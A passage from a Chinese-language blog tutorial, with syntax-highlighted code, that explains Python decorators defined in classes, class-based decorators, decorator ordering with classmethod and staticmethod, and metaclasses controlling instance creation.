class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="comment"># Decorator as an instance method</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator1</span><span class="params">(self, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            print(<span class="string">'Decorator 1'</span>)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decorator as a class method</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator2</span><span class="params">(cls, func)</span>:</span></span><br><span class="line"><span class="meta">        @wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">            print(<span class="string">'Decorator 2'</span>)</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 作为实例方法</span></span><br><span class="line">a = A()</span><br><span class="line"><span class="meta">@a.decorator1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 作为类方法</span></span><br><span class="line"><span class="meta">@A.decorator2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grok</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在类中定义装饰器初看上去好像很奇怪，但是在标准库中有很多这样的例子。 特别的，<code>@property</code>装饰器实际上是一个类，它里面定义了三个方法<code>getter()</code>,<code>setter()</code>,<code>deleter()</code>, 每一个方法都是一个装饰器。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="comment"># Create a property instance</span></span><br><span class="line">    first_name = property()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @first_name.getter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._first_name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @first_name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._first_name = value</span><br></pre></td></tr></table></figure><p>为什么要这么定义的主要原因是各种不同的装饰器方法会在关联的<code>property</code>实例上操作它的状态。 因此，任何时候只要你碰到需要在装饰器中记录或绑定信息，那么这不失为一种可行方法。</p><p>在类中定义装饰器有个难理解的地方就是对于额外参数<code>self</code>或<code>cls</code>的正确使用。尽管最外层的装饰器函数比如<code>decorator1()</code>或<code>decorator2()</code>需要提供一个<code>self</code>或<code>cls</code>参数，但是在两个装饰器内部被创建的<code>wrapper()</code>函数并不需要包含这个<code>self</code>参数。你唯一需要这个参数是在你确实要访问包装器中这个实例的某些部分的时候。其他情况下都不用去管它。</p><p>对于类里面定义的包装器还有一点比较难理解，就是在涉及到继承的时候。例如，假设你想让在<code>A</code>中定义的装饰器作用在子类<code>B</code>中。你需要像下面这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line"><span class="meta">    @A.decorator2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>也就是说，装饰器要被定义成类方法并且你必须显式的使用父类名去调用它。不能使用<code>@B.decorator2</code>，因为在方法定义时，这个类<code>B</code>还没有被创建。</p><h4 id="将装饰器定义为类"><a href="#将装饰器定义为类" class="headerlink" title="将装饰器定义为类"></a>将装饰器定义为类</h4><p>如果想使用一个装饰器去包装函数，但是希望返回一个可调用的实例。需要让你的装饰器可以同时工作在类定义的内部和外部。<br>为了将装饰器定义成一个实例，需要确保它实现了<code>__call__()</code>和<code>__get__()</code>方法。例如，下面的代码定义了一个类，它在其他函数上放置一个简单的记录层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profiled</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">        wraps(func)(self)</span><br><span class="line">        self.ncalls = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.ncalls += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.__wrapped__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> types.MethodType(self, instance)</span><br></pre></td></tr></table></figure><p>可以将它当做一个普通的装饰器来使用，在类里面或外面都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Profiled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @Profiled</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(self, x)</span><br></pre></td></tr></table></figure><p>在交互环境中的使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add.ncalls</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">1</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">2</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.bar(<span class="number">3</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x10069e9d0</span>&gt; <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.bar.ncalls</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="为类和静态方法提供装饰器"><a href="#为类和静态方法提供装饰器" class="headerlink" title="为类和静态方法提供装饰器"></a>为类和静态方法提供装饰器</h4><p>给类或静态方法提供装饰器的前提是要确保装饰器在<code>@classmethod</code>或<code>@staticmethod</code>之前。例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="comment"># A simple decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = func(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end-start)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">instance_method</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        print(self, n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">class_method</span><span class="params">(cls, n)</span>:</span></span><br><span class="line">        print(cls, n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_method</span><span class="params">(n)</span>:</span></span><br><span class="line">        print(n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>装饰后的类和静态方法可正常工作，只不过增加了额外的计时功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.instance_method(<span class="number">1000000</span>)</span><br><span class="line">&lt;__main__.Spam object at <span class="number">0x1006a6050</span>&gt; <span class="number">1000000</span></span><br><span class="line"><span class="number">0.11817407608032227</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.class_method(<span class="number">1000000</span>)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Spam</span>'&gt; 1000000</span></span><br><span class="line"><span class="class">0.11334395408630371</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Spam</span>.<span class="title">static_method</span><span class="params">(<span class="number">1000000</span>)</span></span></span><br><span class="line"><span class="class">1000000</span></span><br><span class="line"><span class="class">0.11740279197692871</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>如果你把装饰器的顺序写错了就会出错。例如下面这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line"><span class="meta">    @timethis</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_method</span><span class="params">(n)</span>:</span></span><br><span class="line">        print(n)</span><br><span class="line">        <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">            n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>调用这个静态方法就会报如下错误：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.static_method(<span class="number">1000000</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">"timethis.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">start = time.time()</span><br><span class="line">TypeError: <span class="string">'staticmethod'</span> object <span class="keyword">is</span> <span class="keyword">not</span> callable</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>问题在于<code>@classmethod</code>和<code>@staticmethod</code>实际上并不会创建可直接调用的对象，而是创建特殊的描述器对象。因此当你试着在其他装饰器中将它们当做函数来使用时就会出错。确保这种装饰器出现在装饰器链中的第一个位置可以修复这个问题。<br>当我们在抽象基类中定义类方法和静态方法时，例如想定义一个抽象类方法，可以使用类似下面的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">(cls)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在这段代码中，<code>@classmethod</code>跟<code>@abstractmethod</code>两者的顺序是有讲究的，如果调换它们的顺序就会出错。</p><h4 id="装饰器为被包装函数增加参数"><a href="#装饰器为被包装函数增加参数" class="headerlink" title="装饰器为被包装函数增加参数"></a>装饰器为被包装函数增加参数</h4><p>如果想在装饰器中给被包装函数增加额外的参数，但是不能影响这个函数现有的调用规则。可以使用关键字参数来给包装函数增加额外参数，考虑如下装饰器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">optional_debug</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, debug=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">'Calling'</span>, func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@optional_debug</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line"><span class="meta">... </span>    print(a,b,c)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>spam(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, debug=<span class="literal">True</span>)</span><br><span class="line">Calling spam</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>通过装饰器来给被包装函数增加参数的做法并不常见。尽管如此，有时候它可以避免一些重复代码。例如，如果有以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(x, y, z, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(x, y, debug=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">'Calling c'</span>)</span><br></pre></td></tr></table></figure><p>可以将其重构为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">optional_debug</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'debug'</span> <span class="keyword">in</span> inspect.getfullargspec(func).args:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'debug argument already defined'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, debug=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            print(<span class="string">'Calling'</span>, func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@optional_debug</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这种实现方案之所以行得通，在于强制关键字参数很容易被添加到接受<code>*args</code>和<code>**kwargs</code>参数的函数中。通过使用强制关键字参数，它被作为一个特殊情况被挑选出来，并且接下来仅仅使用剩余的位置和关键字参数去调用这个函数时，这个特殊参数会被排除在外。也就是说，它并不会被纳入到<code>**kwargs</code>中去。</p><p>还有一个难点就是如何去处理被添加的参数与被包装函数参数直接的名字冲突。例如，如果装饰器<code>@optional_debug</code>作用在一个已经拥有一个<code>debug</code>参数的函数上时会有问题。这里增加了一步名字检查。</p><h4 id="使用装饰器扩充类的功能"><a href="#使用装饰器扩充类的功能" class="headerlink" title="使用装饰器扩充类的功能"></a>使用装饰器扩充类的功能</h4><p>如果想通过反省或者重写类定义的某部分来修改它的行为，但是又不希望使用继承或元类的方式。可以使用类装饰器，例如下面是一个重写了特殊方法<code>__getattribute__</code>的类装饰器，可以打印日志：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_getattribute</span><span class="params">(cls)</span>:</span></span><br><span class="line">    orig_getattribute = cls.__getattribute__</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_getattribute</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'getting:'</span>, name)</span><br><span class="line">        <span class="keyword">return</span> orig_getattribute(self, name)</span><br><span class="line"></span><br><span class="line">    cls.__getattribute__ = new_getattribute</span><br><span class="line">    <span class="keyword">return</span> cls</span><br><span class="line"></span><br><span class="line"><span class="meta">@log_getattribute</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,x)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>使用示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A(<span class="number">42</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.x</span><br><span class="line">getting: x</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.spam()</span><br><span class="line">getting: spam</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="使用元类控制实例的创建"><a href="#使用元类控制实例的创建" class="headerlink" title="使用元类控制实例的创建"></a>使用元类控制实例的创建</h4><p>如果定义了一个类，就能像寒暑易用的调用它来创建实例，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">a = Spam(<span class="string">'warry'</span>)</span><br><span class="line">b = Spam(<span class="string">'elssm'</span>)</span><br></pre></td></tr></table></figure><p>如果想自定义这个步骤，可以定义一个元类并自己实现<code>__call__()</code>方法，如果不希望任何人创建这个类的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoInstances</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">"Can't instantiate directly"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=NoInstances)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grok</span><span class="params">(x)</span>:</span></span><br><span class="line">        print(<span class="string">'Spam.grok'</span>)</span><br></pre></td></tr></table></figure><p>这样的话，用户只能调用这个类的静态方法，而不能使用通常的方法来创建它的实例。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.grok(<span class="number">42</span>)</span><br><span class="line">Spam.grok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"example1.py"</span>, line <span class="number">7</span>, <span class="keyword">in</span> __call__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">"Can't instantiate directly"</span>)</span><br><span class="line">TypeError: Can<span class="string">'t instantiate directly</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>实现单例模式（只能创建唯一实例的类）的示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span><span 